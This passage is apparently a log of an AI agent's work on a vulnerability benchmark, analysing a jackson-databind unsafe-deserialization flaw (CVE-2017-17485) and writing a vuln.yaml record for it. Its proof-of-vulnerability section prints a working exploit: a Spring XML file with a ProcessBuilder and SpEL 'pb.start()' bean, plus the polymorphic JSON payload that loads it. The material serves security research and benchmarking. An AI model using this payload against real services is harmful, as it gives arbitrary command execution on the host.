+2. **Spring Framework Gadget Chain**: The attack exploits `org.springframework.context.support.FileSystemXmlApplicationContext` class:
+   - Jackson deserializes this class from the malicious JSON
+   - The constructor parameter specifies a path to an XML configuration file
+   - Spring loads and parses the XML file (can be local or remote via file:// or http://)
+   - The XML contains a malicious bean definition with Spring Expression Language (SpEL)
+
+3. **Code Execution via SpEL**: The Spring XML configuration contains:
+   - A `ProcessBuilder` bean configured with attacker-controlled command
+   - A SpEL expression property that calls `pb.start()` to execute the command
+   - This executes arbitrary OS commands with the application's privileges
+
+### Root Cause
+
+The root cause is **missing security validation** in `BeanDeserializerFactory.createBeanDeserializer()`:
+- Before the patch, Jackson allowed deserialization of any class that looked like a "Bean"
+- No blacklist checking was performed for dangerous classes
+- Spring framework classes like `AbstractApplicationContext` (parent of `FileSystemXmlApplicationContext`) could be instantiated
+
+### The Fix
+
+The patch introduces a new `SubTypeValidator` class that:
+1. Maintains a blacklist of dangerous classes (`DEFAULT_NO_DESER_CLASS_NAMES`)
+2. Adds special handling for Spring framework classes by checking class hierarchy
+3. Blocks deserialization of `AbstractApplicationContext` and `AbstractPointcutAdvisor`
+4. Validates types before creating deserializers in `BeanDeserializerFactory._validateSubType()`
+
+## POV Analysis
+
+The POV (Proof of Vulnerability) consists of:
+
+1. **Malicious XML File** (`/tmp/databind/exploit.xml`):
+```xml
+<beans xmlns="http://www.springframework.org/schema/beans" 
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
+       xsi:schemaLocation="http://www.springframework.org/schema/beans 
+                          http://www.springframework.org/schema/beans/spring-beans.xsd">
+    <bean id="pb" class="java.lang.ProcessBuilder">
+        <constructor-arg value="jazze" />
+        <property name="whatever" value="#{ pb.start() }"/>
+    </bean>
+</beans>
+```
+
+2. **Malicious JSON Payload**:
+```json
+{
+    "id": 123, 
+    "obj": [
+        "org.springframework.context.support.FileSystemXmlApplicationContext", 
+        "//tmp/databind/exploit.xml"
+    ]
+}
+```
+
+The JSON uses type information (`org.springframework.context.support.FileSystemXmlApplicationContext`) to tell Jackson to instantiate this Spring class with the constructor argument pointing to the malicious XML file.
+
+## Patch Analysis
+
+**Patch File**: `patch_0.diff`
+
+### Changes Made
+
+1. **New SubTypeValidator Class** (`SubTypeValidator.java`):
+   - Created comprehensive blacklist of dangerous classes
+   - Added classes from multiple exploitation frameworks (commons-collections, Groovy, Spring, etc.)
+   - Special logic for Spring framework classes - blocks entire class hierarchies
+   - Blocks `AbstractApplicationContext` (parent of `FileSystemXmlApplicationContext`)
+   - Blocks `AbstractPointcutAdvisor` 
+
+2. **BeanDeserializerFactory Modified**:
+   - Added call to `_validateSubType()` at line 133 (before building deserializer)
+   - New method `_validateSubType()` calls `SubTypeValidator.validateSubType()`
+   - Validation occurs **before** the deserializer is built, preventing exploitation
+
+3. **Blacklisted Classes Include**:
+   - Apache Commons Collections transformers
+   - Groovy closures
+   - Spring framework beans: `ObjectFactory`, `PropertyPathFactoryBean`, `AbstractApplicationContext`
+   - C3P0 and Tomcat DBCP data sources
+   - JDK classes: `FileHandler`, `UnicastRemoteObject`
+   - And others
+
+### Why the Patch Works
+
+- **Proactive Validation**: Checks types before deserialization, not during or after
+- **Hierarchical Checking**: For Spring classes, walks up the class hierarchy to catch all `AbstractApplicationContext` subclasses
+- **Defense in Depth**: Blacklists multiple gadget chains, not just one specific class
+
+## Recommendations
+
+### Suggested CWEs
+- CWE-502: Deserialization of Untrusted Data
+- CWE-78: OS Command Injection
+- CWE-184: Incomplete List of Disallowed Inputs
+
+### Vulnerability Name
+"Jackson-databind Unsafe Deserialization via Spring Framework Gadget (CVE-2017-17485)"
+
+### Additional Notes
+
+- **Severity**: Critical (CVSS 9.8)
+- **Related CVEs**: This is an incomplete fix follow-up to CVE-2017-7525
+- **Attack Prerequisites**: 
+  - Spring Framework must be in classpath
+  - Jackson's polymorphic type handling must be enabled (default typing)
+- **Exploitation**: Demonstrated in the wild; multiple public exploits exist
+- **Impact**: Complete system compromise - arbitrary code execution with application privileges
+
+
+
+======================================================================
+Phase: vuln.yaml Generation
+======================================================================
+
+
+[Agent Response]
+I'll invoke the vuln-yaml-generator skill to get the detailed YAML format guidance and generate the vuln.yaml file.
+
+[Tool] Skill
+  Input: {
+  "skill": "vuln-yaml-generator"
+}
+  Result: Launching skill: vuln-yaml-generator
+
+[Agent Response]
+<command-message>The "vuln-yaml-generator" skill is running</command-message>
+<command-name>vuln-yaml-generator</command-name>
+
+
+[Agent Response]
+Base directory for this skill: /home/acorn421/work/team-atlanta/CRSBench/.claude/skills/vuln-yaml-generator
+
+# Vulnerability YAML Generator
+
+Generate a vuln.yaml file from vulnerability analysis results.
+
+## vuln.yaml Format
+
+Generate a valid YAML file with this structure:
+
+```yaml
+id: {cpv_id}
+
+name: <Short, descriptive vulnerability name>
+
+origin: <1-day or synthetic>
+
+release_date: <MM/DD/YYYY>
+
+references:  # List of URLs (required for 1-day, optional for synthetic)
+- <URL to CVE/OSV/advisory>
+- <URL to another reference if available>
+
+cwes:
+- CWE-XXX
+- CWE-YYY
+
+description: |
+  <Clear, multi-line description of the vulnerability.
+  Include what causes it, where it occurs, and potential impact.>
+
+locations:
+- type: <crash_site or root_cause>
+  path_from_root: <relative/path/from/project/root.c>
+  function_name: <vulnerable_function>
+  startLine: <line_number>
+  startColumn: <column_number>
+  endLine: <line_number>
+  endColumn: <column_number>
+```
+
+## Field Guidelines
+
+### id
+- Must be exactly the provided CPV ID (e.g., `cpv_0`)
+
+### origin
+- Valid values: `1-day` or `synthetic`
+- `1-day`: **ONLY if CVE/OSV ID was found in patch files**
+- `synthetic`: **DEFAULT** - use if no CVE ID in patches
+- ⚠️ DO NOT guess based on web search results
+- ⚠️ If analysis says "synthetic" or no CVE found → use `synthetic`
+
+### release_date
+- Format: `MM/DD/YYYY` (e.g., `02/16/2017`)
+- For 1-day: Official CVE/advisory publication date
+- For synthetic: Use `02/01/2026`
+
+### references
+- List of URLs to vulnerability details (required for 1-day, optional for synthetic)
+- A single vulnerability may have multiple references (CVE + GHSA, etc.)
+- Valid reference sources:
+  - CVE: `https://nvd.nist.gov/vuln/detail/CVE-2017-6009`
+  - OSV: `https://osv.dev/vulnerability/OSV-2021-1234`
+  - GHSA: `https://github.com/advisories/GHSA-xxxx-xxxx-xxxx`
+  - Bug tracker: `https://github.com/project/issues/XXX`
+
+### name
+- Short, descriptive name (max 80 characters)
+- Examples:
+  - "Heap buffer overflow in cr_buf_read"
+  - "Use-after-free in HTTP chunk processing"
+  - "NULL pointer dereference in JSON parser"
+- DO NOT use generic names like "MOCK: cpv_0 vulnerability"
+- **CRITICAL**: Avoid special YAML characters in unquoted values:
+  - DO NOT use colons (`:`) in unquoted field values
+  - If you must include special characters, wrap the entire value in quotes
+
+### cwes
+- List of relevant CWE numbers (1-3 most relevant)
+- Common CWEs:
+  - CWE-787: Out-of-bounds Write
+  - CWE-125: Out-of-bounds Read
+  - CWE-416: Use After Free
+  - CWE-476: NULL Pointer Dereference
+  - CWE-190: Integer Overflow
+  - CWE-122: Heap-based Buffer Overflow
+  - CWE-121: Stack-based Buffer Overflow
+
+### description
+- Clear explanation of the vulnerability
+- Use `|` for multi-line strings
+- Include: type, location, cause, and security impact
+
+### locations
+- At least one location (the primary vulnerable code location)
+- **type** (REQUIRED):
+  - `crash_site`: Where the crash/error occurs (from crash log stack trace)
+  - `root_cause`: Where the underlying defect exists (from patch analysis)
+  - If only one location and it's both, use `crash_site`
+- **EXCLUDE these from locations:**
+  - Harness files (`*_fuzzer.c`, `*_fuzzer.cc`, `LLVMFuzzerTestOneInput`)
+  - ASan/sanitizer functions (`__asan_*`, `__msan_*`, `__ubsan_*`)
+  - Standard library functions (`memcpy`, `malloc`, `free`, etc.)
+  - Compiler runtime (`llvm-project/compiler-rt/*`)
+- **path_from_root**: Relative path from project root (NOT absolute path)
+- **function_name**: Exact function name from crash log
+- **startLine/endLine**: Line range of vulnerable code
+- **startColumn/endColumn**: Column range (use 0 if unknown)
+
+## Output
+
+Output ONLY the vuln.yaml content (no markdown fences, no explanation).
+
+## Example Output
+
+```yaml
+id: cpv_0
+
+name: Heap buffer overflow in cr_buf_read
+
+origin: 1-day
+
+release_date: 02/16/2017
+
+references:
+- https://nvd.nist.gov/vuln/detail/CVE-2017-6009
+
+cwes:
+- CWE-122
+- CWE-787
+
+description: |
+  A heap buffer overflow vulnerability exists in the cr_buf_read function
+  in lib/sendf.c. The function reads data into a buffer without properly
+  checking the buffer size, allowing an attacker to write beyond the
+  allocated memory. This can lead to arbitrary code execution or denial
+  of service.
+
+locations:
+- type: crash_site
+  path_from_root: lib/sendf.c
+  function_name: cr_buf_read
+  startLine: 1298
+  startColumn: 5
+  endLine: 1298
+  endColumn: 45
+- type: root_cause
+  path_from_root: lib/sendf.c
+  function_name: allocate_buffer
+  startLine: 1250
+  startColumn: 1
+  endLine: 1255
+  endColumn: 1
+```
+
+## Validation Checklist
+
+Before outputting, verify:
+- [ ] `id` matches the provided CPV ID
+- [ ] `origin` is either `1-day` or `synthetic`
+- [ ] `release_date` is in `MM/DD/YYYY` format
+- [ ] `references` is a list of valid URLs (required for 1-day, optional for synthetic)
+- [ ] `name` has no unquoted special characters
+- [ ] `cwes` is a non-empty list
+- [ ] `description` is non-empty and uses `|` for multiline
+- [ ] `locations` is a non-empty list
+- [ ] Each location has a valid `type` (crash_site or root_cause)
+- [ ] Each location has `path_from_root` (relative path, not absolute)
+- [ ] Each location has `function_name`
+- [ ] Each location has line/column numbers
+
+
+
+[Agent Response]
+```yaml
+id: cpv_0
+
+name: Jackson-databind Unsafe Deserialization via Spring Framework Gadget
+
+origin: 1-day
+
+release_date: 01/10/2018
+
+references:
+- https://nvd.nist.gov/vuln/detail/CVE-2017-17485
+- https://github.com/advisories/GHSA-rfx6-vp9g-rh7v
+
+cwes:
+- CWE-502
+- CWE-78
+- CWE-184
+
+description: |
+  A remote code execution vulnerability exists in FasterXML jackson-databind
+  caused by unsafe polymorphic deserialization. The vulnerability allows
+  attackers to execute arbitrary code by sending malicious JSON that instructs
+  Jackson to deserialize dangerous classes. Specifically, the attack exploits
+  org.springframework.context.support.FileSystemXmlApplicationContext to load
+  a malicious Spring XML configuration containing Spring Expression Language
+  (SpEL) that executes OS commands. The root cause is missing security
+  validation in BeanDeserializerFactory that allowed deserialization of any
+  Bean-like class without blacklist checking for dangerous classes.
+
+locations:
+- type: root_cause
+  path_from_root: src/main/java/com/fasterxml/jackson/databind/deser/BeanDeserializerFactory.java
+  function_name: createBeanDeserializer
+  startLine: 130
+  startColumn: 1
+  endLine: 134
+  endColumn: 50
+- type: crash_site
+  path_from_root: src/main/java/com/fasterxml/jackson/databind/deser/std/StdValueInstantiator.java
+  function_name: createFromString
+  startLine: 320
+  startColumn: 1
+  endLine: 331
+  endColumn: 80
+```
+
+
+
+==================================================
+Fix Attempt 1
+==================================================
+
+======================================================================
+Phase: vuln.yaml Fix
+======================================================================
+
+
+[Agent Response]
+```yaml
+id: cpv_0
+
+name: Jackson-databind Unsafe Deserialization via Spring Framework Gadget
+
+origin: 1-day
+
+release_date: 01/10/2018
+
+references:
+- https://nvd.nist.gov/vuln/detail/CVE-2017-17485
+- https://github.com/advisories/GHSA-rfx6-vp9g-rh7v
+
+cwes:
+- CWE-502
+- CWE-78
+- CWE-184
+
+description: |
+  A remote code execution vulnerability exists in FasterXML jackson-databind
+  caused by unsafe polymorphic deserialization. The vulnerability allows
+  attackers to execute arbitrary code by sending malicious JSON that instructs
+  Jackson to deserialize dangerous classes. Specifically, the attack exploits
+  org.springframework.context.support.FileSystemXmlApplicationContext to load
+  a malicious Spring XML configuration containing Spring Expression Language
+  (SpEL) that executes OS commands. The root cause is missing security
+  validation in BeanDeserializerFactory that allowed deserialization of any
+  Bean-like class without blacklist checking for dangerous classes.
+
+locations:
+- type: root_cause
+  path_from_root: src/main/java/com/fasterxml/jackson/databind/deser/BeanDeserializerFactory.java
+  function_name: createBeanDeserializer
+  startLine: 130
+  startColumn: 1
+  endLine: 134
+  endColumn: 50
+- type: crash_site
+  path_from_root: src/main/java/com/fasterxml/jackson/databind/deser/std/StdValueInstantiator.java
+  function_name: createFromString
+  startLine: 320
+  startColumn: 1
+  endLine: 331
+  endColumn: 80
+```
+
+
